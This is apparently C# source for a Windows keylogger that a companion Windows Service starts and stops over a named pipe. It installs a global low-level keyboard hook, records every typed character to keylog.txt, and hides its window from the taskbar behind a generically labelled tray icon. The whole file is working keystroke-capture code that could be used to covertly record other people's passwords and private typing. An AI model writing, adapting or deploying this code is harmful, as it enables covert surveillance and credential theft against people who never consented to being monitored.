using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using KeyloggerCommunications;
using System.ServiceModel;

namespace WTKL
{
    /* This class is the keylogger application. This application will be run by the user when
     * they login to their Windows user. Once it starts the application will sit idling until
     * it is signaled by the Windows Service to start keylogging. It will continue keylogging
     * until the Windows Service signals it to stop. Keylogging is done by using Windows hooks
     * to hook into the user input and capture all keyboard input and then pass it along to
     * the rest of the computer.
     */
    class SystemTrayKeylogger : Form, KeyloggerCommInterface
    {
        private const byte VK_BACKSPACE = 8;
        private const byte VK_TAB = 9;
        private const byte VK_ENTER = 13;
        private const byte VK_SHIFT = 16;
        private const byte VK_CONTROL = 17;
        private const byte VK_ALT = 18;
        private const byte VK_CAPS = 20;
        private const byte VK_ESC = 27;
        private const byte VK_SPACE = 32;
        private const byte VK_PAGEUP = 33;
        private const byte VK_PAGEDOWN = 34;
        private const byte VK_END = 35;
        private const byte VK_HOME = 36;
        private const byte VK_PRINTSCREEN = 44;
        private const byte VK_INSERT = 45;
        private const byte VK_DELETE = 46;
        private const byte VK_LWINDOWS = 91;
        private const byte VK_RWINDOWS = 92;
        private const byte VK_NUMLOCK = 144;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const string TEXT_FILE_NAME = "keylog.txt";

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static bool logging = false;
        private static StreamWriter textFileWriter;
        private static byte[] keyStates = new byte[256];
        
        private NotifyIcon trayIcon;
        private ContextMenu trayMenu;
        private ServiceHost host;

        /* The constructor creates the needed windows form components for the application
         * to run in the system tray.
         */
        public SystemTrayKeylogger()
        {
            trayIcon = new NotifyIcon();
            trayMenu = new ContextMenu();

            trayMenu.MenuItems.Add("Exit", OnExit);
            trayIcon.Text = "Tray application";
            trayIcon.Icon = new Icon(SystemIcons.Application, 40, 40);
            trayIcon.ContextMenu = trayMenu;
            trayIcon.Visible = true;
        }

        /* This method is the first method to be ran when the application starts. Just like
         * the service this can be thought of as the main method.
         */
        protected override void OnLoad(EventArgs e)
        {
            this.Visible = false;
            this.ShowInTaskbar = false;

            base.OnLoad(e);
            CreateOpenPipe();

            //For debugging only
            StartKeylogger();
        }

        /* This is the method that is called just before the application stops running,
         * calls to save and close connections should be put here.
         */
        private void OnExit(object sender, EventArgs e)
        {
            ClosePipe();
            Application.Exit();
        }

        /* This method is here to make sure that the system tray icon is properly disposed
         * of so it disappears as soon as the application is closed.
         */
        protected override void Dispose(bool isDisposing)
        {
            if (isDisposing)
            {
                trayIcon.Dispose();
            }
            base.Dispose(isDisposing);
        }

        //Simply starts the application running, the first method called after this is OnLoad.
        [STAThread]
        public static void Main()
        {
            Application.Run(new SystemTrayKeylogger());
        }

        /* This method creates a new pipe to connect with the Windows Service and then opens
         * the connection.
         */
        private void CreateOpenPipe()
        {
            host = new ServiceHost(typeof(SystemTrayKeylogger));
            host.AddServiceEndpoint(typeof(KeyloggerCommInterface), new NetNamedPipeBinding(), "net.pipe://localhost/PipeKeylogger");
            host.Open();
        }

        //Closes the connection between the Windows Service and this application
        private void ClosePipe()
        {
            host.Close();
        }

        /* Starts the keylogger. This is one of the methods that is publicly exposed by the
         * KeyloggerCommInterface and is called over the pipe.
         */
        public bool StartKeylogger()
        {
            if (!logging)
            {
                _hookID = SetHook(_proc);
                logging = true;
            }
            return logging;
        }

        /* Stops the keylogger. This is one of the methods that is publicly exposed by the
         * KeyloggerCommInterface and is called over the pipe.
         */
        public bool StopKeylogger()
        {
            if (logging)
            {
                UnhookWindowsHookEx(_hookID);
                logging = false;
            }
            return logging;
        }

        /* Simply returns true just to let the Windows Service know that it is running. This always
         * returns true because if it's not running then there will be no application to connect to.
         * Need to make sure there's proper error handling being done on the Windows Service side
         * of this method.
         */
        public bool CheckIfRunning()
        {
            return true;
        }

        /* Returns the file path of the keylog text file to the Windows Service.
         */
        public string GetKeylogFilePath()
        {
            return System.AppDomain.CurrentDomain.BaseDirectory.ToString() + TEXT_FILE_NAME;
        }

        /* Delegate for use with callback methods. The variable _proc is created of this type and
         * set equal to the HookCallback method. Whenever there is user input the _proc variable
         * is used to call the HookCallback function.
         */
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, ref keyboardHookStruct lParam);

        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        private static void KeyStateHelper()
        {
            keyStates[VK_BACKSPACE] = ((GetKeyState(VK_BACKSPACE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_TAB] = ((GetKeyState(VK_TAB) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_ENTER] = ((GetKeyState(VK_ENTER) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_SHIFT] = ((GetKeyState(VK_SHIFT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_CONTROL] = ((GetKeyState(VK_CONTROL) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_ALT] = ((GetKeyState(VK_ALT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_CAPS] = ((GetKeyState(VK_CAPS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_ESC] = ((GetKeyState(VK_ESC) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_SPACE] = ((GetKeyState(VK_SPACE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_PAGEUP] = ((GetKeyState(VK_PAGEUP) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_PAGEDOWN] = ((GetKeyState(VK_PAGEDOWN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_END] = ((GetKeyState(VK_END) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_HOME] = ((GetKeyState(VK_HOME) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_PRINTSCREEN] = ((GetKeyState(VK_PRINTSCREEN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_INSERT] = ((GetKeyState(VK_INSERT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_DELETE] = ((GetKeyState(VK_DELETE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_LWINDOWS] = ((GetKeyState(VK_LWINDOWS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_RWINDOWS] = ((GetKeyState(VK_RWINDOWS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_NUMLOCK] = ((GetKeyState(VK_NUMLOCK) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
        }

        /* HookCallback is where the actual reading of user inputs takes place in our application.
         * The method is called by the delegate above whenever there is user input detected by
         * the operating system.
         */
        private static IntPtr HookCallback(int nCode, IntPtr wParam, ref keyboardHookStruct lParam)
        {
            //todo figure out how to edit this keylogging code
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                KeyStateHelper();
                byte[] asciiConvertBuffer = new byte[2];
                byte[] keyboardArray = new byte[256];
                if(ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                {
                    char key = (char)asciiConvertBuffer[0];
                    if ((GetKeyState(VK_CONTROL) & 0x8000) == 0)
                    {
                        if (((GetKeyState(VK_SHIFT) & 0x8000) != 0 ^ (GetKeyState(VK_CAPS) & 0x0001) != 0)
                            && Char.IsLetter(key))
                        {
                            //If shift XOR caps lock then capitalize here
                            key = Char.ToUpper(key);
                        }
                        else
                        {
                            if (Char.IsLetter(key))
                            {
                                key = Char.ToLower(key);
                            }
                        }
                        textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
                        textFileWriter.Write(key);
                        textFileWriter.Close();
                    }
                    else
                    {

                    }
                }
                //int vkCode = Marshal.ReadInt32(lParam);
                //char key = (char)vkCode;
                
                //int vkCode = Marshal.ReadInt32(lParam);
                //textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
                //textFileWriter.Write((Keys)vkCode);
                //textFileWriter.Write(key);
                //textFileWriter.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, ref lParam);
        }

        /* This method is used to set our application's hook into the Windows keyboard
         * input hook chain. It is passed a delegate to be used to call our HookCallback
         * method so we can handle the captured inputs.
         */
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        /*******************************************************************************
         **************************** DLL Import References ****************************
         *******************************************************************************/
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern int ToAscii(int keyCode, int scanCode, byte[] keyboardBuffer, byte[] translateBuffer, int flags);
        
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern short GetKeyState(int virtualKeyCode);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);

        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, ref keyboardHookStruct lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
